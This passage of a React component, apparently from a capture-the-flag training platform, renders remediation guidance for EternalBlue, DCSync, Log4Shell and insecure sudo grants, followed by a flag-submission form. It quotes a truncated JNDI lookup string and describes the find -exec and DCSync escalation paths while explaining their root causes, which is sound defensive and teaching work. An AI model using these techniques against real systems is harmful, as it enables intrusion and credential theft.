                  <span>VULNERABILITY REMEDIATION: LEGACY SMBV1 & ETERNALBLUE (MS17-010)</span>
                </div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  <strong>Root Cause:</strong> Microsoft SMBv1 driver (<code className="text-cyan-300">srv.sys</code>) contains buffer overflow flaws in transaction request handling (CVE-2017-0143).
                </p>
                <div className="bg-black/40 border border-cyan-900/60 p-3 rounded-lg space-y-2">
                  <span className="text-white font-bold block text-xs">Recommended Mitigation Steps:</span>
                  <ul className="list-disc list-inside text-slate-300 text-xs space-y-1">
                    <li><strong>Disable SMBv1:</strong> Execute <code className="text-emerald-400">Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</code> across all domain controllers.</li>
                    <li><strong>Mandate SMB Signing & Encryption:</strong> Enforce SMBv3 signing across Active Directory group policies.</li>
                    <li><strong>Apply Security Updates:</strong> Verify MS17-010 / KB4012215 patch status across all Windows hosts.</li>
                  </ul>
                </div>
              </div>

              <div className="p-5 rounded-xl bg-red-950/20 border border-red-800/80 space-y-3">
                <div className="flex items-center gap-2 text-red-400 font-bold text-sm">
                  <AlertTriangle className="w-5 h-5" />
                  <span>PRIVILEGE ESCALATION REMEDIATION: ACTIVE DIRECTORY TIERING & DCSYNC</span>
                </div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  <strong>Root Cause:</strong> Service accounts with <code className="text-red-300">Backup Operators</code> or <code className="text-red-300">SeBackupPrivilege</code> permissions can execute DRSUAPI replication calls (DCSync) to extract all domain password hashes.
                </p>
                <div className="bg-black/40 border border-red-900/60 p-3 rounded-lg space-y-2">
                  <span className="text-white font-bold block text-xs">Recommended Mitigation Steps:</span>
                  <ul className="list-disc list-inside text-slate-300 text-xs space-y-1">
                    <li><strong>Active Directory Tiering:</strong> Isolate Tier 0 (Domain Controllers, DAs) from Tier 1 (Servers) and Tier 2 (Endpoints).</li>
                    <li><strong>Restrict DCSync Privileges:</strong> Ensure only Domain Controllers have Replicating Directory Changes permissions.</li>
                  </ul>
                </div>
              </div>
            </>
          ) : (
            <>
              <div className="p-5 rounded-xl bg-amber-950/20 border border-amber-800/80 space-y-3">
                <div className="flex items-center gap-2 text-amber-400 font-bold text-sm">
                  <AlertTriangle className="w-5 h-5" />
                  <span>VULNERABILITY REMEDIATION: APACHE LOG4J (CVE-2021-44228 / LOG4SHELL)</span>
                </div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  <strong>Root Cause:</strong> Log4j versions 2.0-beta9 through 2.14.1 perform message lookup substitutions when evaluating format strings (e.g. <code className="text-cyan-300">{"${jndi:ldap://...}"}</code>). Untrusted input passed to logging functions allows attackers to force the server to load arbitrary Java bytecode from remote LDAP/RMI referral servers.
                </p>
                <div className="bg-black/40 border border-amber-900/60 p-3 rounded-lg space-y-2">
                  <span className="text-white font-bold block text-xs">Recommended Mitigation Steps:</span>
                  <ul className="list-disc list-inside text-slate-300 text-xs space-y-1">
                    <li><strong>Upgrade Dependency:</strong> Update <code className="text-emerald-400">org.apache.logging.log4j:log4j-core</code> to version <strong>2.17.1</strong> or newer where message lookups are disabled by default.</li>
                    <li><strong>JVM Flag (Emergency Workaround):</strong> Start JVM with <code className="text-amber-300">-Dlog4j2.formatMsgNoLookups=true</code> or set environment variable <code className="text-amber-300">LOG4J_FORMAT_MSG_NO_LOOKUPS=true</code>.</li>
                    <li><strong>Remove Class from Jar:</strong> <code className="text-slate-200">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></li>
                    <li><strong>Egress Firewall:</strong> Restrict outbound connections from application servers to prevent LDAP (389/1389) and RMI (1099) communication.</li>
                  </ul>
                </div>
              </div>

              <div className="p-5 rounded-xl bg-red-950/20 border border-red-800/80 space-y-3">
                <div className="flex items-center gap-2 text-red-400 font-bold text-sm">
                  <AlertTriangle className="w-5 h-5" />
                  <span>PRIVILEGE ESCALATION REMEDIATION: INSECURE SUDOERS CONFIGURATION</span>
                </div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  <strong>Root Cause:</strong> Granting unprivileged accounts NOPASSWD execution on utilities capable of spawning interactive subshells (such as <code className="text-red-300">/usr/bin/find</code> with <code className="text-red-300">-exec</code>) completely breaks privilege isolation boundaries.
                </p>
                <div className="bg-black/40 border border-red-900/60 p-3 rounded-lg space-y-2">
                  <span className="text-white font-bold block text-xs">Recommended Mitigation Steps:</span>
                  <ul className="list-disc list-inside text-slate-300 text-xs space-y-1">
                    <li><strong>Enforce Principle of Least Privilege:</strong> Remove wildcards and arbitrary binary sudo grants from <code className="text-slate-200">/etc/sudoers</code>.</li>
                    <li><strong>Use Dedicated Scripts:</strong> If automated cleanup is required, invoke controlled shell scripts without parameter interpolation instead of giving access to the generic <code className="text-slate-200">find</code> binary.</li>
                    <li><strong>Consult GTFOBins:</strong> Always cross-reference candidate sudo binaries against GTFOBins before granting elevated execution.</li>
                  </ul>
                </div>
              </div>
            </>
          )}
        </div>
      )}

      {/* Tab 5: Submit Flags */}
      {activeTab === 'flags' && (
        <div className="max-w-xl mx-auto p-6 rounded-xl bg-[#0c1017] border border-slate-800 space-y-4">
          <div className="text-center space-y-1">
            <Key className="w-8 h-8 text-emerald-400 mx-auto" />
            <h2 className="text-base font-bold text-white">SUBMIT TARGET FLAGS</h2>
            <p className="text-slate-400 text-xs">
              Enter cryptographic flag tokens captured from {machine.name}:
            </p>
          </div>

          <form onSubmit={handleFlagSubmit} className="space-y-3">
            <input
              type="text"
              value={flagInput}
              onChange={(e) => setFlagInput(e.target.value)}
              placeholder="ROOTRANGE{...}"
              className="w-full px-3 py-2.5 rounded-lg bg-black/60 border border-slate-800 focus:border-emerald-500 focus:outline-none text-white font-mono text-xs placeholder-slate-600"
            />

            <button
              type="submit"
              className="w-full py-2.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-black font-bold transition-all shadow-[0_0_15px_rgba(16,185,129,0.2)]"
            >
              SUBMIT & CLAIM POINTS
            </button>
          </form>

          {flagFeedback && (
            <div
              className={`p-3 rounded-lg text-xs font-bold text-center border ${
                flagFeedback.success
                  ? 'bg-emerald-950/60 border-emerald-500 text-emerald-300'
                  : 'bg-red-950/60 border-red-500 text-red-300'
              }`}
            >
              {flagFeedback.message}
            </div>
          )}
        </div>
      )}
    </div>
  );
};
